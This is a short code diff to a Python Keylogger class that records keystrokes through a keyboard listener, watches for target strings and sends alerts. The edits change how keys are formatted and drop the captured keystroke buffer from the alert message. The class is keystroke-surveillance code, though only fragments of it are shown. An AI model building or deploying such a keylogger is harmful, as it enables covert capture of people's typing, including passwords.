@@ -22,9 +22,9 @@ class Keylogger:
             current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                current_key = "  "
+                current_key = " "
             else:
-                current_key = " " + str(key) + " "
+                current_key = ""
         self.log(current_key)
 
     def send_alert(self, message):
@@ -44,7 +44,7 @@ class Keylogger:
     def report(self):
         for target_string in self.target_strings:
             if len(self.stored_keys) >= len(target_string) and self.stored_keys[-len(target_string):].lower() == target_string.lower():
-                message = f"Alert: '{target_string}' entered!{self.stored_keys}"
+                message = f"Alert: '{target_string}' entered! in the system 1"
                 self.send_alert(message)
                 print(message)
                 self.stored_keys = ""
@@ -57,7 +57,3 @@ class Keylogger:
         with keyboard_listener as listener:
             self.report()
             listener.join()
-
-
-
-   
